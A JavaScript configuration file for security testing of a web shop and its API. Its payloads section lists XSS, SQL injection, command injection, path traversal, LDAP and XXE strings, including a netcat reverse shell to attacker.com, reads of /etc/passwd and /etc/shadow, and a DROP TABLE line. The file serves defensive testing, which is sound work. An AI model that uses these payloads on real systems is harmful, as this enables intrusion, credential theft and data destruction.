/**
 * Security Testing Configuration
 * Configuration for comprehensive security testing
 */

module.exports = {
  // Security testing scope
  scope: {
    // Web application security testing
    webApp: {
      enabled: true,
      baseUrl: process.env.BASE_URL || 'http://localhost:3000',
      testPages: [
        { name: 'Homepage', url: '/' },
        { name: 'Login', url: '/login' },
        { name: 'Registration', url: '/register' },
        { name: 'Products', url: '/products' },
        { name: 'Cart', url: '/cart' },
        { name: 'Checkout', url: '/checkout' },
        { name: 'Profile', url: '/profile' }
      ]
    },
    
    // API security testing
    api: {
      enabled: true,
      baseUrl: process.env.API_BASE_URL || 'http://localhost:3000/api',
      endpoints: [
        { path: '/auth/login', method: 'POST', protected: false },
        { path: '/auth/register', method: 'POST', protected: false },
        { path: '/users', method: 'GET', protected: true },
        { path: '/users/profile', method: 'GET', protected: true },
        { path: '/products', method: 'GET', protected: false },
        { path: '/products/search', method: 'GET', protected: false },
        { path: '/cart', method: 'GET', protected: true },
        { path: '/orders', method: 'GET', protected: true },
        { path: '/admin/users', method: 'GET', protected: true, admin: true }
      ]
    }
  },
  
  // Vulnerability testing payloads
  payloads: {
    // Cross-Site Scripting (XSS) payloads
    xss: [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "';alert('XSS');//",
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '"><img src=x onerror=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>'
    ],
    
    // SQL Injection payloads
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1 --",
      "1' OR '1'='1' /*",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "' OR 1=1#",
      "' UNION SELECT username, password FROM users--",
      "1; SELECT * FROM users",
      "'; EXEC xp_cmdshell('dir'); --"
    ],
    
    // Command Injection payloads
    commandInjection: [
      '; ls -la',
      '| whoami',
      '&& cat /etc/passwd',
      '`id`',
      '$(whoami)',
      '; ping -c 1 127.0.0.1',
      '| dir',
      '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
      '; cat /etc/shadow',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; nc -e /bin/sh attacker.com 4444'
    ],
    
    // Path Traversal payloads
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
      '..//..//..//etc//passwd',
      '..\\\\..\\\\..\\\\etc\\\\passwd'
    ],
    
    // LDAP Injection payloads
    ldapInjection: [
      '*)(uid=*))(|(uid=*',
      '*)(|(password=*))',
      '*)(&(password=*))',
      '*))%00',
      '*()|%26\'',
      '*)((|(*',
      '*)(objectClass=*'
    ],
    
    // XML Injection payloads
    xmlInjection: [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
      '<![CDATA[<script>alert("XSS")</script>]]>',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;'
    ]
  },
  
  // Security testing categories
  testCategories: {
    inputValidation: {
      enabled: true,
      tests: [
        'xss-prevention',
        'sql-injection-prevention',
        'command-injection-prevention',
        'path-traversal-prevention',
        'ldap-injection-prevention',
        'xml-injection-prevention'
      ]
    },
    
    authentication: {
      enabled: true,
      tests: [
        'password-policy',
        'brute-force-protection',
        'session-management',
        'jwt-security',
        'multi-factor-authentication'
      ]
    },
    
    authorization: {
      enabled: true,
      tests: [
        'access-control',
        'privilege-escalation',
        'idor-prevention',
        'role-based-access'
      ]
    },
    
    sessionManagement: {
      enabled: true,
      tests: [
        'session-fixation',
        'session-hijacking',
        'session-timeout',
        'secure-cookies'
      ]
    },
    
    dataProtection: {
      enabled: true,
      tests: [
        'sensitive-data-exposure',
        'data-encryption',
        'pii-protection',
        'credit-card-data'
      ]
    },
    
    communicationSecurity: {
      enabled: true,
      tests: [
        'https-enforcement',
        'tls-configuration',
        'certificate-validation',
        'hsts-headers'
      ]
    },
    
    errorHandling: {
      enabled: true,
      tests: [
        'information-disclosure',
        'error-message-security',
        'stack-trace-exposure',
        'debug-information'
      ]
    },
    
    configuration: {
      enabled: true,
      tests: [
        'security-headers',
        'cors-configuration',
        'csp-implementation',
        'file-permissions'
      ]
    }
  },
  
  // Security thresholds and scoring
  thresholds: {
    // Vulnerability severity scoring
    severity: {
      critical: { score: 10, maxAllowed: 0 },
      high: { score: 7, maxAllowed: 0 },
      medium: { score: 4, maxAllowed: 2 },
      low: { score: 1, maxAllowed: 5 },
      info: { score: 0, maxAllowed: 10 }
    },
    
    // Overall security score thresholds
    securityScore: {
      excellent: 95,
      good: 80,
      acceptable: 65,
      poor: 50,
      critical: 30
    },
    
    // Performance thresholds for security tests
    performance: {
      maxTestDuration: 300000, // 5 minutes per test
      maxTotalDuration: 1800000, // 30 minutes total
      requestTimeout: 30000, // 30 seconds per request
      retryAttempts: 3
    }
  },
  
  // Security headers configuration
  securityHeaders: {
    required: [
      {
        name: 'Content-Security-Policy',
        description: 'Prevents XSS attacks',
        severity: 'high',
        validValues: ['script-src', 'object-src', 'base-uri']
      },
      {
        name: 'X-Frame-Options',
        description: 'Prevents clickjacking',
        severity: 'medium',
        validValues: ['DENY', 'SAMEORIGIN']
      },
      {
        name: 'X-Content-Type-Options',
        description: 'Prevents MIME type sniffing',
        severity: 'medium',
        validValues: ['nosniff']
      },
      {
        name: 'X-XSS-Protection',
        description: 'Enables XSS filtering',
        severity: 'low',
        validValues: ['1; mode=block']
      },
      {
        name: 'Strict-Transport-Security',
        description: 'Enforces HTTPS',
        severity: 'high',
        validValues: ['max-age=']
      },
      {
        name: 'Referrer-Policy',
        description: 'Controls referrer information',
        severity: 'low',
        validValues: ['strict-origin-when-cross-origin', 'no-referrer']
      }
    ],
    
    // Headers that should not be present
    forbidden: [
      {
        name: 'Server',
        description: 'Reveals server information',
        severity: 'low'
      },
      {
        name: 'X-Powered-By',
        description: 'Reveals technology stack',
        severity: 'low'
      },
      {
        name: 'X-AspNet-Version',
        description: 'Reveals ASP.NET version',
        severity: 'low'
      }
    ]
  },
  
  // Cookie security requirements
  cookieSecurity: {
    sessionCookies: {
      httpOnly: true,
      secure: true, // For HTTPS sites
      sameSite: ['Strict', 'Lax'],
      minLength: 16
    },
    
    // Cookie names that should be secure
    secureCookieNames: [
      'session',
      'sessionid',
      'auth',
      'token',
      'csrf',
      'xsrf'
    ]
  },
  
  // File upload security configuration
  fileUpload: {
    allowedExtensions: ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.doc', '.docx'],
    blockedExtensions: ['.exe', '.bat', '.cmd', '.scr', '.pif', '.com', '.js', '.php', '.asp', '.jsp'],
    maxFileSize: 10485760, // 10MB
    scanForMalware: true,
    quarantineUploads: true
  },
  
  // Rate limiting configuration
  rateLimiting: {
    login: {
      maxAttempts: 5,
      timeWindow: 900000, // 15 minutes
      lockoutDuration: 1800000 // 30 minutes
    },
    
    api: {
      maxRequests: 100,
      timeWindow: 3600000, // 1 hour
      burstLimit: 20
    },
    
    registration: {
      maxAttempts: 3,
      timeWindow: 3600000 // 1 hour
    }
  },
  
  // Reporting configuration
  reporting: {
    formats: ['html', 'json', 'pdf', 'junit'],
    outputDir: 'reports/security',
    includeScreenshots: true,
    includeRequestResponse: true,
    generateExecutiveSummary: true,
    
    // Report sections
    sections: {
      executiveSummary: true,
      vulnerabilityDetails: true,
      riskAssessment: true,
      remediationGuidance: true,
      complianceMapping: true,
      trendAnalysis: true
    }
  },
  
  // Integration settings
  integration: {
    // CI/CD integration
    cicd: {
      failOnCritical: true,
      failOnHigh: true,
      failOnSecurityScore: 65,
      generateArtifacts: true,
      notifyOnFailure: true
    },
    
    // Issue tracking integration
    issueTracking: {
      enabled: false,
      system: 'github', // github, jira, etc.
      autoCreateIssues: false,
      severityMapping: {
        critical: 'P0',
        high: 'P1',
        medium: 'P2',
        low: 'P3'
      }
    },
    
    // SIEM integration
    siem: {
      enabled: false,
      endpoint: process.env.SIEM_ENDPOINT,
      apiKey: process.env.SIEM_API_KEY,
      logLevel: 'warning'
    }
  },
  
  // Compliance frameworks
  compliance: {
    owasp: {
      enabled: true,
      version: 'OWASP Top 10 2021',
      categories: [
        'A01:2021-Broken Access Control',
        'A02:2021-Cryptographic Failures',
        'A03:2021-Injection',
        'A04:2021-Insecure Design',
        'A05:2021-Security Misconfiguration',
        'A06:2021-Vulnerable and Outdated Components',
        'A07:2021-Identification and Authentication Failures',
        'A08:2021-Software and Data Integrity Failures',
        'A09:2021-Security Logging and Monitoring Failures',
        'A10:2021-Server-Side Request Forgery'
      ]
    },
    
    pci: {
      enabled: false,
      requirements: [
        'PCI DSS 3.2.1',
        'PCI DSS 4.0'
      ]
    },
    
    gdpr: {
      enabled: true,
      dataProtectionRequirements: true,
      consentManagement: true,
      dataMinimization: true
    }
  }
};